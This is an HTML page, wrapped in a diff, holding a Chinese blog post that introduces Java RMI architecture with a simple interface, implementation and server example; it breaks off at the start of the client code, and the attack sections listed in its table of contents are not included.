@@ -1,0 +1,1316 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    RMI |
+    
+    S@Ku_yA的blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="RMI前言Remote Procedure Call 远程过程调用  RMI服务是java提供的一种远程调用对象服务 调用对象可以像在调用本地对象一样 RMI架构RMI服务总的来说有3个主要部分: 服务端 客户端 注册中心 服务端 (远程对象)服务端主要用来提供远程对象  注册中心服务端用来将对象绑定在注册表上 客户端客户端通过注册表调用远程对象  stub与skeleton是RMI调用过程中的一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RMI">
+<meta property="og:url" content="http://example.com/2026/03/27/RMI/index.html">
+<meta property="og:site_name" content="S@Ku_yA的blog">
+<meta property="og:description" content="RMI前言Remote Procedure Call 远程过程调用  RMI服务是java提供的一种远程调用对象服务 调用对象可以像在调用本地对象一样 RMI架构RMI服务总的来说有3个主要部分: 服务端 客户端 注册中心 服务端 (远程对象)服务端主要用来提供远程对象  注册中心服务端用来将对象绑定在注册表上 客户端客户端通过注册表调用远程对象  stub与skeleton是RMI调用过程中的一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/20260324161803-fab93c53-2759-1.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260327210003636.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260327210134090.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329141422132.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329141638907.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260402105847072.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260402110046189.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330112908331.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329143316468.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329143527019.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329144324028.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329144400774.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330121105834.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330121057826.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330121234866.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330121906226.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330122004353.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330122102555.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330122145992.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330122524435.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330122730125.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123000894.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123034874.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123133087.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123155857.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123309413.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123419259.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123522755.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123609572.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330123713573.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330131013607.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330131539655.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330131825199.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330132322777.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330132437582.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330132543915.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330132631652.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330132745025.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330132852166.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330133010027.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330133549727.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330133657665.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330133916993.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330134207427.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330134403068.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330134445293.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330134539747.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330134622885.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330134938976.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330135001569.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330135104675.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211302104.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211333734.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211424308.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211535137.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211609878.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211624725.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330211850223.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330212415510.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330212642556.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330220412957.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330220449169.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330220535004.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330220739401.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330220816933.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330221258782.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330221115591.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330221610247.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330222027842.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330222057900.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330222305917.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330222610306.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260330222640410.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329173338262.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260402102438447.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260402102709519.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260402103321100.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260402103550719.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260329221704072.png">
+<meta property="og:image" content="http://example.com/2026/03/27/RMI/image-20260401163011923.png">
+<meta property="article:published_time" content="2026-03-27T11:46:10.000Z">
+<meta property="article:modified_time" content="2026-04-02T03:01:36.705Z">
+<meta property="article:author" content="S@Ku_yA">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="攻击面">
+<meta property="article:tag" content="知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/27/RMI/20260324161803-fab93c53-2759-1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="S@Ku_yA的blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+    
+      
+<link rel="stylesheet" href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css" integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr&#x2F;Io" crossorigin="anonymous">
+
+    
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+    
+    
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+    
+  </nav>
+  
+</div>
+<header id="header" aria-label="Site header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="RMI">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <span id="logo">
+            <h1 data-aos="slide-up">RMI</h1>
+          </span>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI"><span class="toc-number">1.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%9E%B6%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">RMI架构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF-%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">服务端 (远程对象)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">注册中心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.2.3.</span> <span class="toc-text">客户端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.3.</span> <span class="toc-text">RMI的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">1.3.1.</span> <span class="toc-text">服务端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.</span> <span class="toc-text">RMI攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.1.</span> <span class="toc-text">RMI服务端攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Register%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.2.</span> <span class="toc-text">Register攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">RMI底层代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi-Remote"><span class="toc-number">1.5.1.</span> <span class="toc-text">java.rmi.Remote</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-rmi-server-UnicastRemoteObject"><span class="toc-number">1.5.2.</span> <span class="toc-text">java.rmi.server.UnicastRemoteObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E7%9A%84%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.5.3.</span> <span class="toc-text">RMI的动态类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">1.5.4.</span> <span class="toc-text">创建注册中心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="toc-number">1.5.5.</span> <span class="toc-text">远程对象创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9C%8B%E7%9C%8BClient%E6%9F%A5%E6%89%BE%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E4%B8%8E%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.5.6.</span> <span class="toc-text">简单看看Client查找注册中心与查找远程对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8lookup%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.7.</span> <span class="toc-text">如何利用lookup触发反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="S@Ku_yA" class="lazyload">
+  <div class="sidebar-author-name">S@Ku_yA</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">34</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">9</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-RMI" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-03-27T11:46:10.000Z" itemprop="datePublished">2026-03-27</time>
+    <time style="display: none;" id="post-update-time">2026-04-02</time>
+  </span>
+  
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Java%E6%94%BB%E5%87%BB%E9%9D%A2/" title="Java攻击面">Java攻击面</a>
+  </div>
+
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Remote Procedure Call <strong>远程过程调用</strong> </p>
+<p>RMI服务是java提供的一种<strong>远程调用对象服务</strong> 调用对象可以像在调用本地对象一样</p>
+<h2 id="RMI架构"><a href="#RMI架构" class="headerlink" title="RMI架构"></a>RMI架构</h2><p>RMI服务总的来说有3个主要部分: <strong>服务端 客户端 注册中心</strong></p>
+<h3 id="服务端-远程对象"><a href="#服务端-远程对象" class="headerlink" title="服务端 (远程对象)"></a>服务端 (远程对象)</h3><p>服务端主要用来提供远程对象 </p>
+<h3 id="注册中心"><a href="#注册中心" class="headerlink" title="注册中心"></a>注册中心</h3><p>服务端用来将对象绑定在注册表上</p>
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端通过注册表调用远程对象</p>
+<p><img src="/2026/03/27/RMI/20260324161803-fab93c53-2759-1.png" alt="20260324161803-fab93c53-2759-1"></p>
+<p><strong>stub</strong>与<strong>skeleton</strong>是RMI调用过程中的一个代理类</p>
+<p>客户端实际通过<strong>stub</strong>去调<strong>用远程对象并返回结果给客户端</strong></p>
+<p>服务端实际通过<strong>skeleton</strong>去与<strong>stub</strong>进行远程的数据交流</p>
+<hr>
+<h2 id="RMI的实现"><a href="#RMI的实现" class="headerlink" title="RMI的实现"></a>RMI的实现</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端实际有2部分组成 <strong>注册中心 远程对象</strong></p>
+<p>服务端要提供对象服务 需要先有一个接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接口需要先继承一个Remote对象 说明他可以被作为Remote对象在远程调用中被使用 作用就像Serialized类 只是个说明而已</p>
+<p>有了接口还需要一个实现接口的类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIInterfaceImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIInterfaceImpl</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>现在接口实现类已经写好 可以写服务端了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">RMIHOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">RMIPORT</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">RMIURL</span> <span class="operator">=</span> <span class="string">&quot;rmi://&quot;</span> + RMIHOST + <span class="string">&quot;:&quot;</span> + RMIPORT + <span class="string">&quot;/demo&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">           	<span class="comment">//实例化注册中心 并绑定端口</span></span><br><span class="line">            LocateRegistry.createRegistry(RMIPORT);</span><br><span class="line"></span><br><span class="line">            <span class="type">RMIInterfaceImpl</span> <span class="variable">Impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIInterfaceImpl</span>();</span><br><span class="line">            <span class="comment">//将实现类导出为真正的远程对象 并且绑定在指定端口上</span></span><br><span class="line">            <span class="type">RMIInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RMIInterface) UnicastRemoteObject.exportObject(Impl,<span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将stub保存在RMI的注册中心</span></span><br><span class="line">            Naming.bind(RMIURL,stub);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>至此服务端写好了</p>
+<hr>
+<p><strong>客户端</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span 